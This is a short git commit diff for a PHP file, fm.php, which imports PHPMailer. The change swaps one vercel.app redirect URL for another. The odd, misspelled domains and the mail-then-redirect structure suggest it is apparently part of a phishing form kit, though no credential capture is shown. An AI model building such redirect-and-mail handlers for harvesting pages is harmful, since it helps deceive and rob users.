dd38f2445ef89e6e0ea3e1ce0c13df707585239b
team11203 <155807397+team11203@users.noreply.github.com>
2025-07-22 08:24:17 +0500

    Update fm.php

--- fm.php
+++ fm.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://on-on-offical.vercel.app/");
+header("Location:https://in-to-use-in000.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
